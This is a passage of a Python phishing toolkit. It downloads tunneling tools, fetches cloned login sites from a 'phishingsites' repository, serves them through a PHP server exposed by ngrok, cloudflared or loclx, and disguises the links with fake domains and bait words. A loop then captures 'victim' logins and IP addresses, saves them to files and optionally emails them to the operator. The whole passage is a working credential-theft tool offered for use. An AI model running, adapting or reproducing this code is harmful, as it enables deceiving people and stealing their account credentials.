            system("brew install localxpose")
    else:
        system("rm -rf ngrok.zip ngrok.tgz cloudflared.tgz cloudflared loclx.zip")
        internet()
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
            elif architecture.find("arm")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
            elif architecture.find("x86_64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
            else:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
            if isfile("ngrok.tgz"):
                extract("ngrok.tgz", f"{root}/.tunneler")
                remove("ngrok.tgz")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                    extract("ngrok.zip", f"{root}/.tunneler")
                    remove("ngrok.zip")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                    extract("cloudflared.tgz", f"{root}/.tunneler")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
            elif architecture.find("arm64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                    extract("ngrok.zip", f"{root}/.tunneler")
                    remove("ngrok.zip")
                if not iscloudflared:
                    print(f"{error}Device architecture unknown. Download cloudflared manually!")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
            else:
                print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        if isfile("loclx.zip"):
            extract("loclx.zip", f"{root}/.tunneler")
            remove("loclx.zip")
        for tunneler in tunnelers:
            if isfile(f"{root}/.tunneler/{tunneler}"):
                system(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if system(f"pidof {process} > /dev/null 2>&1")==0:
            sprint(f"{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    system("rm -rf $HOME/.site && mkdir $HOME/.site")
    ngrok_token()
    loclx_token()
    if not isfile(email_file):
        return
    with open(email_file) as email_data:
        email_config = email_data.read()
        if is_json(email_config):
            data = loads(email_config)
            email = data["email"]
            password = data["password"]
            receiver = data["receiver"]
            # As the server is of gmail, we only allow gmail login
            if email.find("@gmail.com")!=-1:
                is_mail_ok = True
            else:
                print(f"\n{error}Only gmail with app password is allowed")
                sleep(1)


# 3rd function checking requirements and download files 
def requirements(folder):
    if isfile("websites.zip"):
        system(f"rm -rf {websites_dir}/*")
        extract("websites.zip", websites_dir)
        remove("websites.zip")
    if exists("sites"):
        system(f"rm -rf {websites_dir}")
        system(f"cp -r sites {websites_dir}")
    if isfile(f"{websites_dir}/version.txt"):
        with open(f"{websites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                download(websites_url, "websites.zip")
    else:
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        system(f"rm -rf {websites_dir}/*")
        extract("websites.zip", websites_dir)
        remove("websites.zip")
    site = f"{websites_dir}/{folder}"
    if exists(f"{root}/.websites/{folder}"):
        system(f"cp -r {site}/* $HOME/.site")
    else:
        internet()
        system("rm -rf site.zip")
        download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
        if not exists(f"{websites_dir}/{folder}"):
            mkdir(site)
        extract("site.zip", site)
        remove("site.zip")
        system(f"cp -r {site}/* $HOME/.site")
    server()

# Start server and tunneling
def server():
    system("clear")
    sprint(logo, 0.01)
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        write_error(e)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system('find "$HOME/.tunneler" -name "*.log" -delete')
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        if arguments != "":
            arguments = f"{arguments} --subdomain {subdomain}"
        else:
            arguments = f"--subdomain {subdomain}"
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.tunneler && termux-chroot ./ngrok http {arguments} {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.tunneler && termux-chroot ./cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
        system(f"echo 'cd $HOME/.tunneler && termux-chroot ./loclx tunnel --raw-mode http --https-redirect {arguments} --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
    # Use installed ngrok and cloudflared and localxpose in mac
    elif brew:
        system(f"ngrok http {arguments} {local_url} > /dev/null 2>&1 &")
        system(f"cloudflared tunnel -url {local_url} --logfile $HOME/.tunneler/cf.log > /dev/null 2>&1 &")
        system(f"echo 'localxpose tunnel --raw-mode http --https-redirect {arguments} --to :{port} &> $HOME/.tunneler/loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
    else:
        system(f"cd $HOME/.tunneler && ./ngrok http {arguments} {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.tunneler && ./cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
        system(f"echo 'cd $HOME/.tunneler && ./loclx tunnel --raw-mode http --https-redirect {arguments} --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
    sleep(10)
    try:
        ngrok_api = get("http://127.0.0.1:4040/api/tunnels").json()
        ngrok_url = ngrok_api["tunnels"][0]["public_url"]
    except Exception as e:
        write_error(e)
        ngrok_url = ""
    if ngrok_url.find("ngrok")!=-1:
        ngrok_success=True
    else:
        ngrok_success=False
    for i in range(10):
        if isfile(f"{root}/.tunneler/cf.log"):
            cf_url = popen("cat $HOME/.tunneler/cf.log | grep -Eo 'https://[-0-9a-z]{4,}.trycloudflare.com'").read().strip()
            sleep(1)
        else:
            cf_url = ""
            sprint(f"\n{error}Cloudflared failed to start!{nc}")
        if cf_url.find("cloudflare")!=-1:
            cf_success=True
            break
        else:
            cf_success=False
    for i in range(10):
        if isfile(f"{root}/.tunneler/loclx.log"):
            loclx_url = "https://" + popen("cat $HOME/.tunneler/loclx.log | grep -o '[-0-9a-z.]*.loclx.io'").read().strip()
            sleep(1)
        else:
            loclx_url = ""
            sprint(f"\n{error}Loclx failed to start!{nc}")
        if loclx_url.find("loclx")!=-1:
            loclx_success=True
            break
        else:
            loclx_success=False
    if ngrok_success and cf_success and loclx_success:
        print(f"\n{success}Ngrok, Cloudflared and Loclx have started successfully!")
        url_manager(cf_url, "1", "2")
        url_manager(ngrok_url, "3", "4")
        url_manager(loclx_url, "5", "6")
        if tunneler.lower() == "ngrok":
            cuask(ngrok_url)
        elif tunneler.lower() == "loclx":
            cuask(loclx_url)
        else:
            cuask(cf_url)
    elif ngrok_success and cf_success and not loclx_success:
        print(f"\n{success}Ngrok and Cloudflared have started successfully!")
        url_manager(cf_url, "1", "2")
        url_manager(ngrok_url, "3", "4")
        if tunneler.lower() == "ngrok":
            cuask(ngrok_url)
        else:
            cuask(cf_url)
    elif loclx_success and cf_success and not ngrok_success:
        print(f"\n{success}Cloudflared and Loclx have started successfully!")
        url_manager(cf_url, "1", "2")
        url_manager(loclx_url, "3", "4")
        if tunneler.lower() == "loclx":
            cuask(loclx_url)
        else:
            cuask(cf_url)
    elif ngrok_success and loclx_success and not cf_success:
        print(f"\n{success}Ngrok and Loclx have started successfully!")
        url_manager(ngrok_url, "1", "2")
        url_manager(loclx_url, "3", "4")
        if tunneler.lower() == "ngrok":
            cuask(ngrok_url)
        else:
            cuask(loclx_url)
    elif ngrok_success and not cf_success and not loclx_success:
        print(f"\n{success}Ngrok has started successfully!")
        url_manager(ngrok_url, "1", "2")
        cuask(ngrok_url)
    elif cf_success and not ngrok_success and not loclx_success:
        print(f"\n{success}Cloudflared has started successfully!")
        url_manager(cf_url, "1", "2")
        cuask(cf_url)
    elif loclx_success and not ngrok_success and not cf_success:
        print(f"\n{success}Loclx has started successfully!")
        url_manager(loclx_url, "1", "2")
        cuask(loclx_url)
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()

# Output urls
def url_manager(url, num1, num2):
    global mask
    if num1=="1":
        sprint(f"\n{info}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")


# Ask to mask url and shadow url
def cuask(url):
    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_meta(metaurl)
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        write_error(e)
        res = ""
    resp = popen(f"echo '{res}' | head -n1").read().strip()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short = resp.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(f"{root}/.site/usernames.txt")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata = ufile.read()
                    if is_mail_ok:
                        send_mail(userdata)
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                # Just add the IP
                system(f"cat $HOME/.site/usernames.txt >> {saved_file}")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(f"{root}/.site/ip.txt")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system(f"cat $HOME/.site/ip.txt | head -n1 >> {saved_file}")
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(f"{root}/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
